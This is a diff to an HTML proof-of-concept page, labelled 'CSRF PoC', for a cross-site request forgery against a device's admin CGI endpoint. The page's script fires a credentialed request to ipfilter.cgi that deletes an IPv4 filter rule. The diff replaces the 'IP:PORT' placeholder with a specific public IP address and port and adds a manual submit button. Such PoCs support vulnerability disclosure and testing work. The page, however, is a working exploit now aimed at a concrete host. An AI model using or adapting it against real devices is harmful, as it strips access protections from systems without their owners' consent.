@@ -1,10 +1,12 @@
 <html>
+  <!-- CSRF PoC -->
   <body>
     <script>
-      function submitRequest() {
+      function submitRequest()
+      {
         var xhr = new XMLHttpRequest();
-        xhr.open("GET", "http://IP:PORT/cgi-bin/admin/ipfilter.cgi?method=delv4&index=0", true);
-        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
+        xhr.open("GET", "http:\/\/178.174.114.88:8080\/cgi-bin\/admin\/ipfilter.cgi?method=delv4&index=2", true);
+        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/avif,image\/webp,*\/*;q=0.8");
         xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
         xhr.withCredentials = true;
         var body = "";
@@ -15,5 +17,8 @@
       }
       submitRequest();
     </script>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
   </body>
 </html>
